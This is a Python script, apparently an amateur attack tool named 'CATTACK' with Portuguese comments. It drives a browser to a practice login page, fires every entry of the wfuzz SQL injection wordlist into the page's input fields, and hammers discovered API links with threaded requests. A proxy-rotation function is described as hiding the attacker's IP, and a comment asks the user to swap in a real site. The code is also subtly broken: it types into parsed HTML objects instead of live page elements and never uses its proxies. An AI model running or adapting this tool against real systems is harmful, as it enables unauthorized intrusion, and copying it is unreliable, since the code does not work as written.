#!/usr/bin/env python3
import requests
import time
import random
import threading
from webdriver_manager.chrome import ChromeDriverManager
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup
import string

img= """
_________     ________________________________  _________  ____  __.
\_   ___ \   /  _  \__    ___/\__    ___/  _  \ \_   ___ \|    |/ _|
/    \  \/  /  /_\  \|    |     |    | /  /_\  \/    \  \/|      <  
\     \____/    |    \    |     |    |/    |    \     \___|    |  \ 
 \______  /\____|__  /____|     |____|\____|__  /\______  /____|__ \

        \/         \/                         \/        \/        \/
"""

print(img)

# Função para medir o tempo de resposta de uma API
def medir_tempo_resposta(api_url):
    inicio = time.time()
    response = requests.get(api_url)
    fim = time.time()
    tempo_resposta = fim - inicio
    return response.status_code, tempo_resposta

# Função para ofuscar o IP usando proxies
def obter_proxy():
    proxies_list = [
        'http://proxy1.com:8080', 
        'http://proxy2.com:8080', 
        'http://proxy3.com:8080'
    ]
    return {
        'http': random.choice(proxies_list), 
        'https': random.choice(proxies_list),
    }

# Configurar o Selenium com opções
options = Options()
service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service, options=options)

print("Iniciando varredura.....")

# URL do site para varrer APIs
site_url = 'http://testphp.vulnweb.com/login.php'  # Substitua pelo site real
driver.get(site_url)
time.sleep(5)

# Usar BeautifulSoup para analisar o HTML
soup = BeautifulSoup(driver.page_source, 'html.parser')

# Encontrar elementos de interesse
box_elements = soup.find_all(class_='box')  # Elementos com a classe 'box'

# Encontrar URLs de APIs (exemplo)
api_urls = [a['href'] for a in soup.find_all('a', href=True) if 'api' in a['href']]  # Filtrar links de APIs

# Função para testar SQL Injection usando uma wordlist
def testar_sql_injection(input_element):
    wordlist_path = '/usr/share/wordlists/wfuzz/Injections/SQL.txt'
    with open(wordlist_path, 'r') as f:
        wordlist = f.read().splitlines()

    resultados = []

    for palavra in wordlist:
        input_element.send_keys(palavra)  # Inserir palavra da wordlist no input
        driver.find_element_by_id('submit_button').click()  # Substitua pelo ID do botão de envio

        # Verificar o status da resposta após o envio
        response_status = driver.page_source  # Obter o código-fonte da página após o envio
        resultados.append((palavra, response_status))

    return resultados

# Verificar inputs no site para testar SQL Injection
input_elements = soup.find_all('input')  # Encontrar todos os elementos de input

for idx, input_element in enumerate(input_elements):
    # Coletar os atributos do input
    input_attributes = {
        'id': input_element.get('id'),
        'name': input_element.get('name'),
        'type': input_element.get('type'),
        'placeholder': input_element.get('placeholder')
    }

    # Exibir o índice e os atributos do input
    print(f"Input {idx + 1}: {input_attributes}")
    
    print("Dados coletados!")


# Testar cada input encontrado para SQL Injection
for input_element in input_elements:
    resultados = testar_sql_injection(input_element)
    for resultado in resultados:
        print(f"Palavra: {resultado[0]}, Resultado: {resultado[1]}")

# Usar threads para paralelizar requisições GET para as APIs encontradas
def testar_api(api_url):
    status, tempo_resposta = medir_tempo_resposta(api_url)
    print(f"API: {api_url}, Status: {status}, Tempo de Resposta: {tempo_resposta:.2f} segundos")

threads = []

for api_url in api_urls:
    t = threading.Thread(target=testar_api, args=(api_url,))
    threads.append(t)
    t.start()

# Aguardar que todas as threads terminem
for t in threads:
    t.join()

driver.quit()
